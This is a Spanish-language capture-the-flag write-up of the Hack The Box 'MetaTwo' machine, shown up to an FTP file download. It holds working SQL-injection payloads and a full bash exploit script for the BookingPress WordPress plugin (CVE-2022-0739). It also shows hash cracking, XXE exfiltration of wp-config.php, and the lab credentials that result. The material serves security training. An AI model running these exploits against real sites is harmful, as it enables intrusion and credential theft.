---
title: Hackthebox Writeup Metatwo
date: 2022-11-15 23:57:17 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Easy, CVE-2022-0739, CVE-2021-29447, SQLI, XXE, Information Leakage, Passpie]

img_path: /assets/img/htb/writeups/metatwo
---

# Overview

1. Worpress credentials by **Unauthenticated SQL Injection (CVE-2022-0739)**
2. FTP credentials by **Authenticated XXE Within the Media Library (CVE-2021-29447)**
3. SSH login by **Information leak in FTP files** (Foothold)
4. Export of credentials in passpie by **Gnupg key leak** (Privilege Escalation)

![Logo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.186 |  29 Oct 2022 |    Easy    |   20   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.186
PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.
64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=139 ms
                                          \______________________ Linux Machine
--- 10.10.11.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 138.695/138.695/138.695/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Empezamos con la fase de reconocimiento haciendo un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir los puertos abiertos de la máquina:

```console
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.186
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 00:06 -05
Nmap scan report for 10.10.11.186
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
              \_________________ File Transfer Protocol
22/tcp open  ssh
              \_________________ Secure Shell Protocol
80/tcp open  http
              \_________________ Hypertext Transfer Protocol
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> --open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Ahora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos **21(FTP)** - **22(SSH)** - **80(HTTP)**:

```console
❯ nmap -p21,22,80 -sCV 10.10.11.186 -oN open_ports_TCP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 00:08 -05
Nmap scan report for 10.10.11.186
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/16%Time=63747066%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear
>
> -sCV (Fusión de parámetros -sC -sV)
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
>
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

De primeras `nmap` no nos muestra información interesante por el puerto **21(FTP)**. Por parte del puerto **22(SSH)** observamos que la versión no es menor a la `7.7`, lo cúal nos permitiría enumerar usuarios. Por ello, empezamos enumerando el servicio web del puerto **80(HTTP)** que de primeras nos muestra una redirección al dominio `metapress.htb`

Ya que se aplica el concepto de **Virtual hosting**, lo que hacemos es agregar esta ruta a nuestro archivo del sistema que se **encarga de asociar/resolver/apuntar una dirección ip a un nombre de dominio** _/etc/hosts_ : `echo '10.10.11.186 metapress.htb' >> /etc/hosts`

Ahora comenzamos a enumerar que tecnologías usa el dominio encontrado:

> Usando `whatweb`

```console
❯ whatweb metapress.htb
http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
```

Lo que nos llama la atención es el uso del CMS `Wordpress`, a pesar de tener la versión no conseguimos encontrar alguna vulnerabilidad al respecto. Sin embargo, es muy común que las principales fallas de seguridad sean a través de los **plugins** que tienen instalados

> Enumeración manual en `Wordpress`: [https://www.armourinfosec.com/wordpress-enumeration/](https://www.armourinfosec.com/wordpress-enumeration/)
{: .prompt-info}

Para ello hice un script en `bash` con el objetivo de aplicar la técnica de **Web scraping** y encontrar todas las urls disponibles:

```bash
#!/bin/bash

## Ctrl + c 
# (function)
signal_handler(){
  echo -e "\n[!] User terminated."
  tput cnorm; exit 1 # return cursor and exit
}
# (signal)
trap signal_handler SIGINT


## Functions
# display help panel
help(){
  echo -e "\nDescription: Web scraping or website"
  echo
  echo "[*] Use: $0 target_url"
  echo
}

# valid arguments
if [[ $# -ne 1 ]]
then
  help
  tput cnorm; exit 1
fi

# get the urls of a website
get_urls(){
  local scan_depth_limit=$2
  target_url=$1

  local website_urls=$(curl -s $target_url | grep -oP "href=[\"|'](.*?)[\"|']" | awk -F'=' '{print $2}' | tr -d "\"'" | grep -vE "^(#|//)" | sort -u | xargs)
  IFS=' ' read -ra website_urls_array <<< "$website_urls"
  
  ((scan_depth_limit--))
  for url in "${website_urls_array[@]}"
  do
    if [[ "$url" != *"$target_domain"* ]]
    then
      continue
    fi
    
    echo $url
    echo $url >> all_urls.txt

    if [[ ! $scan_depth_limit -eq 0 ]]
    then
      get_urls "$url" $scan_depth_limit &
    else
      return
    fi
  done; wait
}


# Main flow
# ---------
tput civis # hice cursor (esthetic)

scan_depth_limit=4

echo -n '' > all_urls.txt # create file to save urls

target_domain=$(echo $1 | awk -F'//' '{print $2}' | tr -d '\n') # only find with specific domain
echo -e "\n[*] Scanning site: $1\n"
get_urls "$1" $scan_depth_limit # call function (recursive)

echo -e "\n[+] Saving output: all_urls.txt"
cat all_urls.txt | sort -u | sponge all_urls.txt # filter unique urls and save

tput cnorm # return cursor
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_MetaTwo/url_scraping.sh)
{: .prompt-info}

Al ejecutarlo abrimos el listados de las urls encontradas:

```console
❯ cat all_urls.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: all_urls.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ http://metapress.htb/
   2   │ http://metapress.htb/about-us/
   3   │ http://metapress.htb/author/admin/
   4   │ http://metapress.htb/author/admin/feed/
   5   │ http://metapress.htb/category/news/
   6   │ http://metapress.htb/category/news/feed/
   7   │ http://metapress.htb/comments/feed/
   8   │ http://metapress.htb/events/
   9   │ http://metapress.htb/feed/
  10   │ http://metapress.htb/hello-world/
  11   │ http://metapress.htb/?p=1
  12   │ http://metapress.htb/?p=19
  13   │ http://metapress.htb/?p=21
  14   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10
  15   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10
  16   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10
  17   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10
  18   │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10
  19   │ http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1
  20   │ http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
  21   │ http://metapress.htb/wp-includes/css/dist/block-library/style.min.css?ver=5.6.2
  22   │ http://metapress.htb/wp-includes/css/dist/block-library/theme.min.css?ver=5.6.2
  23   │ http://metapress.htb/wp-includes/wlwmanifest.xml
  24   │ http://metapress.htb/wp-json/
  25   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fabout-us%2F
  26   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fabout-us%2F&#038;format=xml
  27   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fevents%2F
  28   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fevents%2F&#038;format=xml
  29   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fhello-world%2F
  30   │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fhello-world%2F&#038;format=xml
  31   │ http://metapress.htb/wp-json/wp/v2/categories/3
  32   │ http://metapress.htb/wp-json/wp/v2/pages/19
  33   │ http://metapress.htb/wp-json/wp/v2/pages/21
  34   │ http://metapress.htb/wp-json/wp/v2/posts/1
  35   │ http://metapress.htb/wp-json/wp/v2/users/1
  36   │ http://metapress.htb/xmlrpc.php?rsd
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Oservamos el plugin `bookingpress` y su versión `1.0.10`, con esta información podemos buscar vulnerabilidades asociadas como la siguiente:

> [CVE-2022-0739](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

![CVE-2022-0739](CVE-2022-0739.png){: .shadow}

> En caso que no encuentras la versión en la url, puedes leer información respecto al plugin en su archivo `readme.txt` : [https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/](https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/)
{: .prompt-tip}

## Foothold

* * *

> ¿ Qué es `bookingpress` ?
>
> Bookingpress es un plugin de Wordpress que nos automatiza un sistema de programación (reservas de citas, pagos, auto-reserva) dirigida a industrias que ofrezcan un servicio que requiera estás características

La vulnerabilidad nos permite, como cualquier usuario no autenticado, **inyectar código SQL y obtener respuesta sobre la base de datos por detrás**. 

Veamos los pasos que debemos seguir:

1. Debemos encontrar en la página web un sistema tipo reservas sobre un servicio
2. De la página de servicios debemos extraer, del código fuente, el `nonce` [**"number user once"**](https://codex.wordpress.org/WordPress_Nonces) (ayuda a proteger la autorización sobre una URL)
3. Solicitar una petición al archivo `admin-ajax.php` (archivo que ofrece apoyo a los plugins y themes al momento de realizar peticiones) e inyectar código SQL en en el parámetro `total_service` de la data por POST

Para el paso `1`, con una enumeración rápida encontrarás la siguiente página:

![http://metapress.htb/events](vulnerable_page_CVE-2022-0739.png){: .shadow}

Y si nos si nos fijamos en la [**documentación de bookingpress**](https://www.bookingpressplugin.com/documents/quick-start-guide/) tendremos el mismo formato:

![https://www.bookingpressplugin.com/](bookingpress_events_doc.png){: .shadow}

> Tambíen si examinamos el código fuente encontraremos urls enlazadas al plugin **bookingpress**
{: .prompt-info}

En el paso `2`, solo es cuestión de buscar en el código fuente el `_wpnonce`. Y por último `3`, solicitamos la petición de la siguiente manera:

> Usando `curl`

```shell
❯ curl -si 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=b81f4b63a7&category_id=33&total_service=-1) UNION SELECT 1,2,3,4,5,6,7,8,group_concat(0x7c, version(), 0x7c)-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 16 Nov 2022 20:12:41 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"1","bookingpress_category_id":"2","bookingpress_service_name":"3","bookingpress_service_price":"$4.00","bookingpress_service_duration_val":"5","bookingpress_service_duration_unit":"6","bookingpress_service_description":"7","bookingpress_service_position":"8","bookingpress_servicedate_created":"|10.5.15-MariaDB-0+deb11u1|","service_price_without_currency":4,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```
{: .nolineno}

Ahora solo es cuestión de listar la base de datos, así que hice un script en `bash` para ello:

```bash
#!/bin/bash

# CVE-2022-0739
# -------------
# Description: SQL injection via bookingpress_front_get_category_services AJAX action (unauthenticated users)
#
# Author: Marss
# Date: 08 Nov, 2022


# Ctrl + c
# (function)
signal_handler(){
  echo -e "\n[!] User terminated."
  tput cnorm; exit 1 # return cursor and exit
}

# (signal)
trap signal_handler SIGINT


## Functions
# Display help panel
help_panel(){
  echo -e "\nCVE-2022-0739"
  echo -e "-------------"
  echo
  echo -e "[*] Use: $0 -u target_url -d database -t table -c column"
  echo
}

# extract nonce of target url
extract_nonce(){
  echo $(curl -si "$target_url/events/" | grep -oP -m 1 "_wpnonce:'(.*?)'" | awk -F':' '{print $2}' | tr -d "'\n")
}

# query modes
get_databases(){
  echo "-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -"
}

get_tables_len(){
  tables_data="-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema$2-- -"

  output=$(make_injection $1 "$tables_data")
  tables_len=$(echo $output | awk -F',' '{print NF}' | tr -d '\n')
  
  echo $tables_len
}
get_tables(){
  echo "-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema$1 group by table_name ASC limit 0,$2-- -"
}

get_table_number(){
  table_number=$(echo $2 | tr ' ' '\n' | grep -n $1 | awk -F ':' '{print $1}' | tr -d '\n')
  echo $table_number
}
get_columns(){
  echo "1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_schema$1 group by table_name ASC limit $2,1-- -"
}

get_values(){
  echo "-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, $1, 0x7c) from $2.$3-- -"
}

# select injection type
get_injection_type(){
  if [[ $database == "blog" ]]
  then
    database_name="=database()"
  else
    database_name="!=database()"
  fi

  if [[ $target_url && ! $database && ! $table && ! $column ]]
  then
    get_databases

  elif [[ $target_url && $database && $table && $column ]]
  then
    get_values $column $database $table

  elif [[ $target_url && $database && $table ]]
  then 
    tables_len=$(get_tables_len $user_nonce $database_name)
    tables_injection=$(get_tables $database_name $tables_len)
    tables_output=$(make_injection $user_nonce "$tables_injection")

    table_number=$(get_table_number $table "$tables_output")

    output=$(get_columns $database_name $table_number)
    echo $output 

  elif [[ $target_url && $database ]]
  then  
    tables_len=$(get_tables_len $user_nonce $database_name)

    get_tables $database_name $tables_len
  fi
}

# insert sql injection
make_injection(){
  user_nonce=$1
  payload_injection=$2
  
  echo $(curl -s "$target_url/wp-admin/admin-ajax.php" \
  --data "action=bookingpress_front_get_category_services&_wpnonce=$user_nonce&category_id=1&total_service=$payload_injection" \
  | grep -oP "\"\|(.*?)\|\"")
}

# start sql injection attack
start_attack(){

  user_nonce=$(extract_nonce)

  payload_injection=$(get_injection_type)

  output=$(make_injection $user_nonce "$payload_injection")
  echo
  echo $output | tr ',' ' ' | tr ' ' '\n' | tr -d '"'
  echo
}

## Main flow
# No arguments
if [ "$#" -eq 0 ]
then
  help_panel
  exit 1
fi

tput civis # hide cursor

# Valid options
while getopts ":hu:d:t:c:" option
do
  case $option in
    h) # display help panel
      help_panel 
      tput cnorm; exit;;
    u) # save target url
      target_url=$OPTARG;;
    d) # save database name
      database=$OPTARG;;
    t) # save table name
      table=$OPTARG;;
    c) # save column name
      column=$OPTARG;;
    \?) # invalid option
      echo -e "\n[x] Error: Invalid option."
      tput cnorm; exit;;
  esac
done; tput cnorm # return cursor

# insert injection to target url
start_attack
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_MetaTwo)
{: .prompt-info}

Ahora ejecutamos el script y conseguimos el hash de las contraseñas del usuario `admin` y `manager`:

```shell
❯ bash sql_injection.sh -u "http://metapress.htb" -d "blog" -t "wp_users" -c "user_pass"

|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70|
```
{: .nolineno}

> El prefix `$P$` corresponse al tipo de hash `PHPass`, él cual usa `Wordpress` para mayor protección en sus contraseñas
{: .prompt-tip}

Ya que disponemos de hashes, lo que hacemos es usar `John the Ripper` para crackearlas:

```console
❯ cat dumb_hashes
───────┬───────────────────────────────────────────────────────────────────────────────────────────
       │ File: dumb_hashes
───────┼───────────────────────────────────────────────────────────────────────────────────────────
   1   │ admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
   2   │ manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
───────┴───────────────────────────────────────────────────────────────────────────────────────────

❯ john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt dumb_hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
1g 0:00:00:58 10.34% (ETA: 16:11:53) 0.01720g/s 28378p/s 30281c/s 30281C/s junabhe..jumbo8
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session aborted
```

Al final solo consiguimos crackear las credenciales `manager:partylikearockstar`, y como son de wordpress procedemos a logearnos en _wp-login.php_:

![http://metapress.htb/wp-admin/profile.php](manager_session.png){: .shadow}

Como ya estamos autenticados y tenemos la version del `Wordpress` (fase de enumeración). Al buscar vulnerabilidades como usuarios autenticados y de la versión `5.6.2`, encontramos lo siguiente:

> [CVE-2021-29447](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)

![CVE-2021-29447](CVE-2021-29447.png){: shadow}

En resumen, gracias a que la funcionalidad de la subida de archivos `.wav` es vulnerable a una inyección **XML external entity (XXE)**, podemos extraer archivos importantes del sistema.

Debemos tener lo siguiente:

1. Archivo `.dtd` (Document Type Definition) con lenguaje XML que a nivel de sistema, por medio de wrapper de php, extraiga el archivo que solicitemos y luego realize una petición a nosotros usando como parámetro de la solicitud el archivo anteriormente requerido
2. Archivo `.wav` con código XML inyectado para que ejecute en el sistema una petición hacia nuestro archivo `.dtd`
3. Abrir un servidor para compartir nuestro archivo y ver las peticiones que nos realizará la máquina objetivo

> Para una explicación más detallada sobre la explotación de esta vulnerabilidad te recomiendo el siguiente articulo: [https://www.pinguytaz.net/index.php/2021/09/04/cve-2021-29447-vulnerabilidad-xxe-wordpress-ctf/](https://www.pinguytaz.net/index.php/2021/09/04/cve-2021-29447-vulnerabilidad-xxe-wordpress-ctf/)
{: .prompt-info}

Después de diseñar bien nuestros archivos intentamos extraer el archivo de configuración de `Wordpress` _wp-config.php_:

```console
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.186 - - [16/Nov/2022 16:39:18] "GET /poc.dtd HTTP/1.1" 200 -
10.10.11.186 - - [16/Nov/2022 16:39:18] "GET /?PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1" 200 -
10.10.11.186 - - [16/Nov/2022 16:39:18] "GET /poc.dtd HTTP/1.1" 200 -
. . .
```

Desencriptamos la data en `base64` y conseguimos el archivo `wp-config.php`:

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Observamos unas posibles credenciales de **FTP**, y recordando que teniamos el puerto **21(FTP)** logramos conectarnos:

```console
❯ ftp 10.10.11.186 21
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:potro): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
229 Entering Extended Passive Mode (|||60192|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||6925|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5 14:12 ..
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
226 Transfer complete
ftp> get send_email.php
